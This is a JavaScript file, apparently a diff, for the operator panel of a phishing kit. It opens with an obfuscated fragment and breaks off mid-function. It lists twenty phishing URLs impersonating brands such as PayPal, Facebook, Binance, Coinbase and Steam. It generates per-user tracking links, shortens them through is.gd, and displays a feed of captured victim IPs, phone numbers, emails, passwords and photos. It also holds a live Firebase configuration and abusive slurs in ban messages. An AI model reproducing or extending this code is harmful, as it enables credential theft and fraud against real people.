_0x1f6ce8=_0xc57b,_0x488174=_0x15c3ad,_0x47f386=_0x166853[_0x488174(0x229)];if(_0x47f386&&_0x47f386[_0x1f6ce8(0x34d)](':')){const _0x310a66=_0x47f386[_0x488174(0x2e7)](':')[0x0][_0x488174(0x2d2)]();if(_0x310a66)_0x3cd614[_0x488174(0x2b1)](_0x310a66);}});}_0x35fd81[_0x49b812(0x38b)](_0x49b812(0x2f2),()=>{const _0x4a9d90=_0xc57b,_0x1647bd=_0x49b812,_0x1f078b=_0x35fd81[_0x4a9d90(0x368)],_0x36a4b1=_0x35fd81[_0x1647bd(0x23e)],_0x167aae=_0x1f078b[_0x4a9d90(0x254)]('@',_0x36a4b1-0x1);if(_0x167aae===-0x1)return _0x99f300[_0x1647bd(0x36a)][_0x1647bd(0x2a4)]=_0x1647bd(0x277);const _0x4facd8=_0x1f078b[_0x1647bd(0x22c)](_0x167aae+0x1,_0x36a4b1)[_0x1647bd(0x296)](),_0x7976af=[..._0x3cd614][_0x1647bd(0x1c0)](_0x2ea08e=>_0x2ea08e[_0x1647bd(0x296)]()[_0x1647bd(0x215)](_0x4facd8));if(!_0x7976af[_0x1647bd(0x297)])return _0x99f300[_0x1647bd(0x36a)][_0x4a9d90(0x1fb)]=_0x1647bd(0x277);_0x99f300[_0x4a9d90(0x2bf)]='',_0x7976af[_0x1647bd(0x28c)](_0x85ab46=>{const _0x4c3b2c=_0x382f,_0x3388d2=_0x4a9d90,_0x52cd7c=_0x1647bd,_0x697f45=document[_0x3388d2(0x2c1)](_0x52cd7c(0x282));_0x697f45[_0x52cd7c(0x229)]=_0x85ab46,_0x697f45[_0x52cd7c(0x36a)][_0x52cd7c(0x24c)]=_0x52cd7c(0x1c4),(_0x697f45[_0x52cd7c(0x388)]=()=>_0x697f45[_0x52cd7c(0x36a)][_0x52cd7c(0x356)]=_0x4c3b2c(0x2b3),_0x697f45[_0x3388d2(0x288)][_0x52cd7c(0x35f)]=_0x52cd7c(0x38a)),(_0x697f45[_0x52cd7c(0x1cf)]=()=>_0x697f45[_0x52cd7c(0x36a)][_0x52cd7c(0x356)]='',_0x697f45[_0x52cd7c(0x36a)][_0x4c3b2c(0x21f)]=_0x52cd7c(0x1b7)),_0x697f45[_0x3388d2(0x297)]=()=>{const _0x131dc6=_0x4c3b2c,_0x129e49=_0x3388d2,_0x3c6313=_0x52cd7c;_0x35fd81[_0x3c6313(0x33f)]=_0x1f078b[_0x3c6313(0x22c)](0x0,_0x167aae)+'@'+_0x85ab46+'\x20'+_0x1f078b[_0x129e49(0x29c)](_0x36a4b1),_0x99f300[_0x3c6313(0x36a)][_0x3c6313(0x2a4)]=_0x131dc6(0x310),_0x35fd81[_0x3c6313(0x364)]();},_0x99f300[_0x52cd7c(0x319)](_0x697f45);}),_0x99f300[_0x1647bd(0x36a)][_0x1647bd(0x2a4)]=_0x1647bd(0x381);}),document[_0x49b812(0x38b)](_0x278cf8(0x1bf),_0x4450a7=>{const _0xf08d87=_0x382f,_0x37b3d6=_0x278cf8,_0x4ac6a2=_0x49b812;!_0x35fd81[_0xf08d87(0x2dd)](_0x4450a7[_0x4ac6a2(0x28a)])&&!_0x99f300[_0x4ac6a2(0x36d)](_0x4450a7[_0x4ac6a2(0x28a)])&&(_0x99f300[_0x37b3d6(0x288)][_0x4ac6a2(0x2a4)]=_0x4ac6a2(0x277));}),setInterval(_0x231311,0x7d0),_0x231311();},0x7d0);}());
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-app.js";
+
+import { getAuth, onAuthStateChanged } from "https://www.gstatic.com/firebasejs/12.6.0/firebase-auth.js";
+
+import {
+
+  getFirestore, collection, getDocs, getDoc, query, where, orderBy, doc, updateDoc, addDoc, setDoc,
+
+  onSnapshot, deleteDoc, serverTimestamp, writeBatch, limit
+
+} from "https://www.gstatic.com/firebasejs/12.6.0/firebase-firestore.js";
+
+const firebaseConfig = {
+
+    apiKey: "AIzaSyBgqYhRV8CrmlMkr6yBF1DpE_zCgXIE660",
+
+    authDomain: "panel-admi-633cd.firebaseapp.com",
+
+    projectId: "panel-admi-633cd",
+
+    storageBucket: "panel-admi-633cd.firebasestorage.app",
+
+    messagingSenderId: "664308369374",
+
+    appId: "1:664308369374:web:4342c3a417968b1d23bf4f"
+
+};
+
+const app = initializeApp(firebaseConfig);
+
+const auth = getAuth(app);
+
+const db = getFirestore(app);
+
+const $id = id => document.getElementById(id);
+
+let miLinkId = null;
+
+let miUserDocId = null;
+
+let ultimoCambioNombre = null;
+
+let isBanned = false;
+
+let banUntil = 0;
+
+// ====== ANTI-SPAM, MODALES, ESTILOS (versión final y completa) ======
+
+const mensajeHistory = {};
+
+const BAN_100_AÑOS = 200 * 365 * 24 * 60 * 60 * 1000;
+
+let isGloballyBanned = false;
+
+// ====== FUNCIÓN PARA ENVIAR MENSAJE DE BANEO AL CHAT GLOBAL ======
+
+async function enviarMensajeBanGlobal(nombreUsuario) {
+
+    try {
+
+        // Envía un mensaje al chat global informando sobre el baneo
+
+        await addDoc(collection(db, "chatMensajes"), {
+
+            texto: `El usuario ${nombreUsuario} se autobaneó por rata`,
+
+            usuario: "Sistema",
+
+            uidRemitente: "sistema", // ID especial para mensajes del sistema
+
+            fecha: serverTimestamp(),
+
+            colorChat: "#ff0000", // Color rojo para destacar
+
+            esMensajeSistema: true // Marcar como mensaje especial del sistema
+
+        });
+
+    } catch (error) {
+
+        console.error("Error al enviar mensaje de baneo:", error);
+
+    }
+
+}
+
+async function checkAntiSpam(texto, uidRemitente) {
+
+    if (isGloballyBanned) {
+
+        mostrarModalSpamBloqueado(200);
+
+        return false;
+
+    }
+
+    console.log("Anti-spam: Enviando '" + texto + "'");
+
+    let now = Date.now();
+
+    const userRef = doc(db, "panelUsers", uidRemitente);
+
+    const userSnap = await getDoc(userRef);
+
+    if (!userSnap.exists()) return false;
+
+    const data = userSnap.data();
+
+    let banUntil = data.banUntil ? data.banUntil.toMillis() : 0;
+
+    let lastMessageTime = data.lastMessageTime ? data.lastMessageTime.toMillis() : 0;
+
+    let spamStreak = data.spamStreak || 0;
+
+    if (banUntil > now) {
+
+        let años = Math.ceil((banUntil - now) / (365 * 24 * 3600000));
+
+        mostrarModalSpamBloqueado(años);
+
+        mostrarAvisoSpam(true, años);
+
+        return false;
+
+    }
+
+    if (texto.length > 500) {
+
+        await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS) });
+
+        mostrarModalSpamBan();
+
+        mostrarAvisoSpam(true, 200);
+
+        return false;
+
+    }
+
+    let diff = now - lastMessageTime;
+
+    if (diff < 1800) {
+
+        spamStreak += 1;
+
+        if (spamStreak < 4) mostrarModalSpamProgreso(spamStreak);
+
+    } else {
+
+        spamStreak = 1;
+
+    }
+
+if (spamStreak >= 4) {
+
+  // Obtener el nombre del usuario antes de actualizar el documento
+
+  const userSnap = await getDoc(userRef);
+
+  // Obtener el nombre directamente del input del chat, que es el más actualizado
+
+const nombreUsuario = $id("chatUsuario").value.trim() || "Anónimo";
+
+  
+
+  await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS), spamStreak, lastMessageTime: new Date(now) });
+
+  isGloballyBanned = true;
+
+  deshabilitarInteraccion();
+
+  
+
+  // Enviar mensaje al chat global
+
+  await enviarMensajeBanGlobal(nombreUsuario);
+
+  
+
+  mostrarModalSpamBan();
+
+  mostrarAvisoSpam(true, 200);
+
+  await eliminarMensajesSpamGlobalmente(uidRemitente);
+
+  return false;
+
+}
+
+    await updateDoc(userRef, { lastMessageTime: new Date(now), spamStreak });
+
+    mostrarAvisoSpam(false);
+
+    if (!mensajeHistory[uidRemitente]) mensajeHistory[uidRemitente] = [];
+
+    mensajeHistory[uidRemitente].push({ texto: texto.trim(), timestamp: now });
+
+    if (mensajeHistory[uidRemitente].length > 20) mensajeHistory[uidRemitente].shift();
+
+const ultimos4 = mensajeHistory[uidRemitente].slice(-4);
+
+if (ultimos4.length === 4 && ultimos4.every(m => m.texto === ultimos4[0].texto)) {
+
+  // Obtener el nombre del usuario antes de actualizar el documento
+
+  const userSnap = await getDoc(userRef);
+
+  // Obtener el nombre directamente del input del chat, que es el más actualizado
+
+const nombreUsuario = $id("chatUsuario").value.trim() || "Anónimo";
+
+  
+
+  await updateDoc(userRef, { banUntil: new Date(now + BAN_100_AÑOS) });
+
+  isGloballyBanned = true;
+
+  deshabilitarInteraccion();
+
+  
+
+  // Enviar mensaje al chat global
+
+  await enviarMensajeBanGlobal(nombreUsuario);
+
+  
+
+  mostrarModalRataDetectada();
+
+  mostrarAvisoSpam(true, "200 AÑOS");
+
+  await eliminarMensajesSpamGlobalmente(uidRemitente);
+
+  return false;
+
+}
+
+return true;
+
+}
+
+async function eliminarMensajesSpamGlobalmente(uidRemitente) {
+
+    const batch = writeBatch(db);
+
+    const q = query(collection(db, "chatMensajes"), where("uidRemitente", "==", uidRemitente), orderBy("fecha", "desc"), limit(10));
+
+    const snapshot = await getDocs(q);
+
+    snapshot.forEach(docSnap => {
+
+        batch.update(docSnap.ref, { texto: "[Este mensaje fue eliminado]", eliminado: true });
+
+    });
+
+    await batch.commit();
+
+}
+
+
+
+function deshabilitarInteraccion() {
+
+    document.querySelectorAll('button, input, a, textarea, select').forEach(el => {
+
+        el.disabled = true;
+
+        el.style.pointerEvents = 'none';
+
+        el.style.opacity = '0.5';
+
+    });
+
+    document.body.style.cursor = 'not-allowed';
+
+}
+
+
+
+function mostrarModalRataDetectada() {
+
+    let div = document.createElement("div");
+
+    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.98);z-index:99999;display:flex;justify-content:center;align-items:center;";
+
+    div.innerHTML = `
+
+    <div style="background:#000;border:6px solid #f00;padding:60px;border-radius:20px;box-shadow:0 0 100px #f00;text-align:center;font-family:monospace;color:#f00;font-size:32px;text-shadow:0 0 30px #f00;animation:shake 0.4s infinite;">
+
+        <div style="font-size:80px;margin-bottom:20px;">RATA DETECTADA</div>
+
+        <div style="font-size:28px;color:#ff0;">BAN DE 200 AÑOS</div>
+
+        <div style="font-size:20px;margin:20px 0;color:#fff;">Spam repetitivo = Eliminado para siempre</div>
+
+        <div style="font-size:18px;color:#888;">Tus últimos mensajes han sido eliminados.</div>
+
+    </div>
+
+    `;
+
+    document.body.appendChild(div);
+
+    setTimeout(() => div.remove(), 8000);
+
+}
+
+
+
+function mostrarModalSpamBan() {
+
+    let div = document.createElement("div");
+
+    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;justify-content:center;align-items:center;";
+
+    div.innerHTML = `
+
+    <div style="background:#000;border:4px solid #f00;padding:40px 50px;border-radius:15px;box-shadow:0 0 50px #f00;text-align:center;font-family:monospace;color:#f00;font-size:24px;text-shadow:0 0 20px #f00;">
+
+        <div style="font-size:32px;margin-bottom:20px;animation:shake 0.5s infinite;">RATA</div>
+
+        <div style="font-size:28px;">VIOLASTE LAS REGLAS</div>
+
+        <div style="font-size:22px;color:#ff0;">POR SPAM, RATA ASQUEROSA</div>
+
+        <div style="font-size:16px;color:#888;margin-top:15px;">Ban: 200 AÑOS</div>
+
+    </div>
+
+    `;
+
+    document.body.appendChild(div);
+
+    setTimeout(() => div.remove(), 4000);
+
+}
+
+
+
+function mostrarModalSpamProgreso(streak) {
+
+    let div = document.createElement("div");
+
+    div.style.cssText = "position:fixed;top:20px;right:20px;background:rgba(255,0,0,0.8);color:#fff;padding:10px 15px;border-radius:8px;z-index:9999;font-family:monospace;border:2px solid #f00;animation:fadeInOut 2s forwards;";
+
+    div.innerHTML = `Racha spam: \${streak}/4 – ¡Cuidado, rata!`;
+
+    document.body.appendChild(div);
+
+    setTimeout(() => div.remove(), 2000);
+
+}
+
+
+
+function mostrarModalSpamBloqueado(años) {
+
+    let div = document.createElement("div");
+
+    div.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.95);z-index:99999;display:flex;justify-content:center;align-items:center;";
+
+    div.innerHTML = `
+
+    <div style="background:#000;border:4px solid #f00;padding:30px 40px;border-radius:12px;box-shadow:0 0 40px #f00;text-align:center;font-family:monospace;color:#f00;font-size:20px;text-shadow:0 0 15px #f00;animation:shake 0.5s infinite;">
+
+        <div style="font-size:26px;margin-bottom:10px;">ACCESO DENEGADO</div>
+
+        <div style="color:#ff0;font-size:16px;">Bloqueado por \${años} año(s)</div>
+
+    </div>
+
+    `;
+
+    document.body.appendChild(div);
+
+    setTimeout(() => div.remove(), 3000);
+
+}
+
+
+
+function mostrarAvisoSpam(activo, texto = null) {
+
+    let aviso = $id("avisoSpam");
+
+    if (!aviso) {
+
+        aviso = document.createElement("div");
+
+        aviso.id = "avisoSpam";
+
+        aviso.style.cssText = "position:fixed;top:10px;left:50%;transform:translateX(-50%);background:rgba(255,0,0,0.9);color:#fff;padding:8px 16px;border-radius:8px;z-index:9999;font-family:monospace;display:none;";
+
+        document.body.appendChild(aviso);
+
+    }
+
+    if (activo) {
+
+        aviso.textContent = texto ? `Baneado Por Rata 🐭🖕Tu madre es Puta ❤️` : "Baneado Por Rata 🐭🖕Tu madre es Puta ❤️";
+
+        aviso.style.display = "block";
+
+    } else {
+
+        aviso.style.display = "none";
+
+    }
+
+}
+
+
+
+// Asegúrate de tener este estilo para las animaciones
+
+const style = document.createElement('style');
+
+style.textContent = `
+
+    @keyframes shake { 0%, 100% { transform: translateX(0); } 25% { transform: translateX(-10px); } 75% { transform: translateX(10px); } }
+
+    @keyframes fadeInOut { 0% { opacity: 1; } 100% { opacity: 0; } }
+
+`;
+
+document.head.appendChild(style);
+
+function disableUI() {
+
+  $id("chatSend").disabled = true;
+
+  $id("chatSend").style.opacity = "0.5";
+
+  $id("btnMostrarAcortador").disabled = true;
+
+  $id("fakeSelect").style.pointerEvents = "none";
+
+  $id("fakeSelect").style.opacity = "0.5";
+
+  const btnCopiar = document.querySelector('[onclick="copiarLink()"]');
+
+  if (btnCopiar) {
+
+    btnCopiar.disabled = true;
+
+    btnCopiar.style.opacity = "0.5";
+
+  }
+
+  document.querySelectorAll('.btn').forEach(b => {
+
+    b.disabled = true;
+
+    b.style.opacity = "0.5";
+
+  });
+
+  mostrarAvisoSpam(true, Math.ceil((banUntil - Date.now()) / (365 * 24 * 3600000)));
+
+}
+
+function enableUI() {
+
+  $id("chatSend").disabled = false;
+
+  $id("chatSend").style.opacity = "1";
+
+  $id("btnMostrarAcortador").disabled = false;
+
+  $id("fakeSelect").style.pointerEvents = "auto";
+
+  $id("fakeSelect").style.opacity = "1";
+
+  const btnCopiar = document.querySelector('[onclick="copiarLink()"]');
+
+  if (btnCopiar) {
+
+    btnCopiar.disabled = false;
+
+    btnCopiar.style.opacity = "1";
+
+  }
+
+  document.querySelectorAll('.btn').forEach(b => {
+
+    b.disabled = false;
+
+    b.style.opacity = "1";
+
+  });
+
+  mostrarAvisoSpam(false);
+
+}
+
+// ================== CARGA USUARIO ==================
+
+onAuthStateChanged(auth, async (user) => {
+
+    if (!user) {
+
+        location.replace("login.html");
+
+        return;
+
+    }
+
+    localStorage.setItem("usuarioNombre", user.email);
+
+    if ($id("userLogged")) $id("userLogged").textContent = user.email;
+
+    miUserDocId = user.uid;
+
+    miLinkId = user.uid;
+
+    const userRef = doc(db, "panelUsers", miUserDocId);
+
+    onSnapshot(userRef, (snap) => {
+
+      if (snap.exists()) {
+
+        const data = snap.data();
+
+        const now = Date.now();
+
+        if (data.banUntil && data.banUntil.toMillis() > now) {
+
+          if (!isBanned) {
+
+            isBanned = true;
+
+            banUntil = data.banUntil.toMillis();
+
+            disableUI();
+
+            mostrarModalSpamBloqueado(Math.ceil((banUntil - now) / (365 * 24 * 3600000)));
+
+          }
+
+        } else {
+
+          if (isBanned) {
+
+            isBanned = false;
+
+            enableUI();
+
+          }
+
+        }
+
+      }
+
+    });
+
+    generarEnlacesUnicos();
+
+    iniciarListenerVictimas();
+
+    actualizarOnline();
+
+    iniciarChat();
+
+    iniciarLluviaBinaria();
+
+    cargarFondosGuardados();
+
+    await cargarUltimoCambioNombre();
+
+});
+
+// ================== ENLACES ÚNICOS ==================
+
+// (Todo igual, no toqué nada aquí)
+
+// Your exact plantillas array (20 phishing URLs)
+const plantillas = [
+  { name: "BetPlay", url: "https://betplay.glegogle5341-af7.workers.dev/" },
+  { name: "Facebook", url: "https://facebook.glegogle5341-af7.workers.dev/" },
+  { name: "Netflix", url: "https://netflix.glegogle5341-af7.workers.dev/" },
+  { name: "Amazon", url: "https://amazon.glegogle5341-af7.workers.dev/" },
+  { name: "Google", url: "https://google.glegogle5341-af7.workers.dev/" },
+  { name: "Microsoft", url: "https://microsoft.glegogle5341-af7.workers.dev/" },
+  { name: "PayPal", url: "https://paypal.glegogle5341-af7.workers.dev/" },
+  { name: "Instagram", url: "https://instagram.glegogle5341-af7.workers.dev/" },
+  { name: "Twitter", url: "https://twitter.glegogle5341-af7.workers.dev/" },
+  { name: "TikTok", url: "https://tiktok.glegogle5341-af7.workers.dev/" },
+  { name: "Spotify", url: "https://spotify.glegogle5341-af7.workers.dev/" },
+  { name: "HBO", url: "https://hbo.glegogle5341-af7.workers.dev/" },
+  { name: "Disney", url: "https://disney.glegogle5341-af7.workers.dev/" },
+  { name: "Apple", url: "https://apple.glegogle5341-af7.workers.dev/" },
+  { name: "Binance", url: "https://binance.glegogle5341-af7.workers.dev/" },
+  { name: "Coinbase", url: "https://coinbase.glegogle5341-af7.workers.dev/" },
+  { name: "WhatsApp", url: "https://whatsapp.glegogle5341-af7.workers.dev/" },
+  { name: "Telegram", url: "https://telegram.glegogle5341-af7.workers.dev/" },
+  { name: "Steam", url: "https://steam.glegogle5341-af7.workers.dev/" },
+  { name: "Roblox", url: "https://roblox.glegogle5341-af7.workers.dev/" }
+];
+
+let miLinkId = null; // User's Firebase UID
+let miUserDocId = null;
+
+// Your existing Firebase imports and initialization code here...
+// import { auth, db } from './firebase-config.js';
+// onAuthStateChanged(auth, (user) => { ... });
+
+/**
+ * Validate if user's account is still active
+ * Checks: document exists, login_expires not passed, activo: true
+ */
+async function validarUsuarioActivo(uid) {
+  try {
+    const userDocRef = doc(db, 'panelUsers', uid);
+    const userDocSnap = await getDoc(userDocRef);
+    
+    if (!userDocSnap.exists()) {
+      console.log('Usuario no encontrado');
+      return false;
+    }
+    
+    const userData = userDocSnap.data();
+    const ahora = new Date();
+    
+    // Check if expired
+    if (userData.login_expires && new Date(userData.login_expires) < ahora) {
+      console.log('Usuario expirado');
+      return false;
+    }
+    
+    // Check if disabled
+    if (userData.activo === false) {
+      console.log('Usuario desactivado');
+      return false;
+    }
+    
+    return true;
+  } catch (error) {
+    console.error('Error validando usuario:', error);
+    return false;
+  }
+}
+
+/**
+ * Your exact generarEnlacesUnicos() function with validation integration
+ */
+async function generarEnlacesUnicos() {
+  if (!miLinkId) {
+    alert('Error: No se ha inicializado el usuario');
+    return;
+  }
+  
+  // Validate user account first
+  const esValido = await validarUsuarioActivo(miLinkId);
+  if (!esValido) {
+    alert('¡ERROR! Tu cuenta ha expirado o está desactivada. Contacta soporte.');
+    return;
+  }
+  
+  const enlacesContainer = document.getElementById('enlacesContainer');
+  if (!enlacesContainer) {
+    console.error('No se encontró el contenedor de enlaces');
+    return;
+  }
+  
+  enlacesContainer.innerHTML = `
+    <div class="enlaces-grid">
+      ${plantillas.map((plantilla, index) => {
+        const enlaceCompleto = `${plantilla.url}?uid=${miLinkId}`;
+        return `
+          <div class="enlace-card" data-index="${index}">
+            <div class="enlace-header">
+              <h3>${plantilla.name}</h3>
+              <div class="enlace-actions">
+                <button onclick="copiarLink('${enlaceCompleto}')" class="btn-copy">📋 Copiar</button>
+                <span class="status activo">✅ Activo</span>
+              </div>
+            </div>
+            <div class="enlace-url">
+              <input type="text" value="${enlaceCompleto}" readonly class="url-input">
+            </div>
+          </div>
+        `;
+      }).join('')}
+    </div>
+  `;
+}
+
+/**
+ * Your exact copiarLink() function with validation
+ */
+async function copiarLink(enlace) {
+  if (!miLinkId) {
+    alert('Error: Usuario no inicializado');
+    return;
+  }
+  
+  // Double-check validation before copying
+  const esValido = await validarUsuarioActivo(miLinkId);
+  if (!esValido) {
+    alert('¡ERROR! Tu cuenta ha expirado o está desactivada. Este enlace ya no funciona.');
+    return;
+  }
+  
+  try {
+    await navigator.clipboard.writeText(enlace);
+    // Visual feedback
+    const btn = event.target;
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '✅ Copiado!';
+    btn.style.background = '#28a745';
+    setTimeout(() => {
+      btn.innerHTML = originalText;
+      btn.style.background = '';
+    }, 2000);
+  } catch (err) {
+    // Fallback for older browsers
+    const textArea = document.createElement('textarea');
+    textArea.value = enlace;
+    document.body.appendChild(textArea);
+    textArea.select();
+    document.execCommand('copy');
+    document.body.removeChild(textArea);
+    
+    const btn = event.target;
+    const originalText = btn.innerHTML;
+    btn.innerHTML = '✅ Copiado!';
+    btn.style.background = '#28a745';
+    setTimeout(() => {
+      btn.innerHTML = originalText;
+      btn.style.background = '';
+    }, 2000);
+  }
+}
+
+// Initialize when user logs in
+async function inicializarUsuario(user) {
+  miLinkId = user.uid;
+  miUserDocId = user.uid;
+  
+  // Validate immediately
+  const esValido = await validarUsuarioActivo(miLinkId);
+  if (!esValido) {
+    alert('¡ERROR! Tu cuenta ha expirado o está desactivada.');
+    // Optionally redirect to login or error page
+    // window.location.href = 'login.html';
+    return;
+  }
+  
+  // Generate links if container exists
+  const enlacesContainer = document.getElementById('enlacesContainer');
+  if (enlacesContainer) {
+    generarEnlacesUnicos();
+  }
+}
+
+// Auto-validation every 5 minutes (300000 ms)
+setInterval(async () => {
+  if (miLinkId) {
+    const esValido = await validarUsuarioActivo(miLinkId);
+    if (!esValido) {
+      alert('¡ATENCIÓN! Tu cuenta ha expirado o fue desactivada. Todos tus enlaces ya no funcionan.');
+      // Refresh page or redirect
+      window.location.reload();
+    }
+  }
+}, 300000);
+// ================== ACORTADOR ==================
+
+// (Igual)
+
+$id("btnMostrarAcortador").onclick = () => $id("ventanaAcortador").style.display = "block";
+
+$id("btnCerrarAcortador").onclick = () => $id("ventanaAcortador").style.display = "none";
+
+$id("acortadorBtn").onclick = async () => {
+
+  const url = $id("acortadorUrlOriginal").value.trim();
+
+  const alias = $id("acortadorUrlAlias").value.trim();
+
+  if (!url) return $id("acortadorResultado").textContent = "Falta URL";
+
+  const res = await fetch(`https://is.gd/create.php?format=json&url=${encodeURIComponent(url)}${alias ? `&shorturl=${alias}` : ""}`);
+
+  const data = await res.json();
+
+  if (data.shorturl) {
+
+    $id("acortadorResultado").innerHTML = `<span style="color:#0f0">${data.shorturl}</span> <button class="btn" onclick="navigator.clipboard.writeText('${data.shorturl}'); mostrarCopiadoAcortador()">Copiar</button>`;
+
+    let links = JSON.parse(localStorage.getItem("misEnlaces")||"[]");
+
+    links.unshift(data.shorturl);
+
+    localStorage.setItem("misEnlaces", JSON.stringify(links));
+
+  } else $id("acortadorResultado").textContent = data.errormessage || "Error";
+
+};
+
+window.mostrarCopiadoAcortador = () => {
+
+  const msg = document.getElementById('mensajeCopiadoAcortador');
+
+  if (msg) {
+
+    msg.style.display = 'block';
+
+    setTimeout(() => msg.style.display = 'none', 3000);
+
+  }
+
+};
+
+// ================== BOTONES DEL MENÚ ==================
+
+// (Igual)
+
+window.mostrarContacto = () => $id("contacto").style.display = $id("contacto").style.display === "block" ? "none" : "block";
+
+window.mostrarRegistros = () => $id("registros").style.display = $id("registros").style.display === "block" ? "none" : "block";
+
+window.togglePanel = () => $id("panel").classList.toggle("abierto");
+
+// ================== MIS ENLACES ACORTADOS ==================
+
+// (Igual)
+
+window.mostrarMisEnlaces = () => {
+
+  const links = JSON.parse(localStorage.getItem("misEnlaces") || "[]");
+
+  const lista = $id("enlacesLista");
+
+  lista.innerHTML = links.length ? links.map(l => `<div><a href="${l}" target="_blank" style="color:#0f0">${l}</a></div>`).join("") : "<p style='color:#f30'>Sin enlaces</p>";
+
+  $id("ventanaMisEnlaces").style.display = "block";
+
+};
+
+window.cerrarMisEnlaces = () => $id("ventanaMisEnlaces").style.display = "none";
+
+// ================== VÍCTIMAS (SISTEMA DE VISTA INTEGRADA) ==================
+
+
+
+function iniciarListenerVictimas() {
+
+    if (!miUserDocId) return;
+
+    const colRef = collection(db, "panelUsers", miUserDocId, "victimas");
+
+    onSnapshot(query(colRef, orderBy("fecha", "desc")), mostrarVictimas);
+
+}
+
+
+
+function mostrarVictimas(snap) {
+
+    const cont = $id("registros");
+
+    if (!cont) return;
+
+
+
+    if (snap.empty) {
+
+        cont.innerHTML = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button> <div style="color:#ff8800;padding:25px;text-align:center;font-size:15px;">Aún no tienes víctimas</div>`;
+
+        return;
+
+    }
+
+
+
+    let html = `<button class="btn-red-clear" onclick="vaciarMisVictimas()">Vaciar todas</button> <div style="max-height:60vh;overflow-y:auto;padding:6px;">`;
+
+
+
+    snap.forEach(d => {
+
+        const v = d.data();
+
+        const fecha = v.fecha ? new Date(v.fecha.toDate()).toLocaleString() : "Ahora";
+
+        const docId = d.id;
+
+
+
+        html += `<div style="background:rgba(0,255,0,0.1);border:1px solid #0f0;border-radius:8px;padding:10px;margin:5px 0;font-size:13px;line-height:1.4;">`;
+
+
+
+        // --- LÓGICA PARA LA FOTO ---
+
+        if (v.fotoMiniatura) {
+
+            html += `
+
+                <div style="text-align: center; margin-bottom: 10px;">
+
+                    <img src="${v.fotoMiniatura}" alt="Foto de la víctima" style="max-width: 150px; max-height: 150px; border-radius: 8px; border: 1px solid #ccc; object-fit: cover; cursor: pointer;" 
+
+                         onclick="mostrarFotoCompleta('${encodeURIComponent(v.fotoOriginal)}')">
+
+                    <br>
+
+                    <small style="color: #aaa;">(Haz clic para ver completo)</small>
+
+                </div>
+
+            `;
+
+        }
+
+        // --- FIN DE LA LÓGICA PARA LA FOTO ---
+
+
+
+        html += `<strong style="color:#0f0">${v.template || "Phishing"}</strong><br>`;
+
+        if (v.ip) html += `IP: <b style="color:#0ff">${v.ip}</b><br>`;
+
+        if (v.numero) html += `Número: <b style="color:#0ff">${v.numero}</b><br>`;
+
+        if (v.correo) html += `Correo: <b style="color:#fff">${v.correo}</b><br>`;
+
+        if (v.contraseña) html += `Contraseña: <b style="color:#fff">${v.contraseña}</b><br>`;
+
+        
+
+        html += `<small style="color:#0f0;">${fecha}</small></div>`;
+
+    });
+
+
+
+    html += `</div>`;
+
+    cont.innerHTML = html;
+
+}
+
+
+
+// --- NUEVAS FUNCIONES PARA EL SISTEMA DE VISTA INTEGRADA ---
+
+
+
+// Función para mostrar la vista completa de la foto
+
+window.mostrarFotoCompleta = (imageData) => {
+
+    const vistaCompleta = $id("vista-completa-foto");
+
+    const imagenCompleta = $id("imagen-completa");
+
+    const registros = $id("registros");
+
+
+
+    // Decodificar y poner la URL en la imagen grande
+
+    imagenCompleta.src = decodeURIComponent(imageData);
+
+    
+
+    // Ocultar la lista de registros y mostrar la vista completa
+
+    registros.style.display = 'none';
+
+    vistaCompleta.style.display = 'block';
+
+};
+
+
+
+// Función para regresar a la lista de víctimas
+
+window.regresarAVictimas = () => {
+
+    const vistaCompleta = $id("vista-completa-foto");
+
+    const registros = $id("registros");
+
+
+
+    // Ocultar la vista completa y mostrar la lista de registros
+
+    vistaCompleta.style.display = 'none';
+
+    registros.style.display = 'block';
+
+};
+
+
+
+// --- Event Listener para el botón "Regresar" ---
+
+// Se ejecuta cuando el DOM está listo
+
+document.addEventListener('DOMContentLoaded', () => {
+
+    const btnRegresar = $id("btn-regresar");
+
+    if (btnRegresar) {
+
+        btnRegresar.addEventListener('click', regresarAVictimas);
+
+    }
+
+});
+
+
+
+
+
+// La función vaciarMisVictimas no necesita cambios.
+
+window.vaciarMisVictimas = async () => {
+
+    if (!miUserDocId) {
+
+        mostrarNotif("Error: No se pudo identificar el usuario.");
+
+        console.error("Error: miUserDocId no está definido al intentar vaciar víctimas.");
+
+        return;
+
+    }
+
+    mostrarModalPro(
+
+        "VACIAR VÍCTIMAS",
+
+        "¿Estás seguro de que quieres borrar <b>TODAS</b> las víctimas registradas? Esta acción es <b style='color:#f00;'>IRREVERSIBLE</b>.",
+
+        "SÍ, BORRAR TODO",
+
+        "CANCELAR",
+
+        async () => {
+
+            try {
+
+                const snap = await getDocs(collection(db, "panelUsers", miUserDocId, "victimas"));
+
+                if (snap.empty) {
+
+                    mostrarNotif("No hay víctimas para borrar.");
+
+                    return;
+
+                }
+
+                const deletePromises = snap.docs.map(doc => deleteDoc(doc.ref));
+
+                await Promise.all(deletePromises);
+
+                mostrarNotif("Todas las víctimas han sido eliminadas.");
+
+            } catch (error) {
+
+                console.error("Error al vaciar las víctimas:", error);
+
+                mostrarNotif("Error al intentar borrar las víctimas.");
+
+            }
+
+        }
+
+    );
+
+};
+
+// ================== USUARIOS ACTIVOS (TODOS) ==================
+
+// (Igual)
+
+async function actualizarOnline() {
+
+  if (!miUserDocId) return;
+
+  await setDoc(doc(db, "panelUsers", miUserDocId), {
+
+    online: true,
+
+    ultimaActividad: serverTimestamp()
+
+  }, { merge: true });
+
+  const q = query(collection(db, "panelUsers"), where("ultimaActividad", ">=", new Date(Date.now() - 60000)));
+
+  onSnapshot(q, (snap) => {
+
+    if ($id("contadorActivos")) $id("contadorActivos").textContent = snap.size;
+
+  });
+
+}
+
+setInterval(actualizarOnline, 10000);
+
+// ================== MODAL PRO ==================
+
+// (Igual)
+
+function mostrarModalPro(titulo, texto, btnSi, btnNo, callbackSi) {
+
+  const modal = document.createElement("div");
+
+  modal.style.cssText = "position:fixed;inset:0;background:rgba(0,0,0,0.97);z-index:99999;display:flex;justify-content:center;align-items:center;";
+
+  modal.innerHTML = `
+
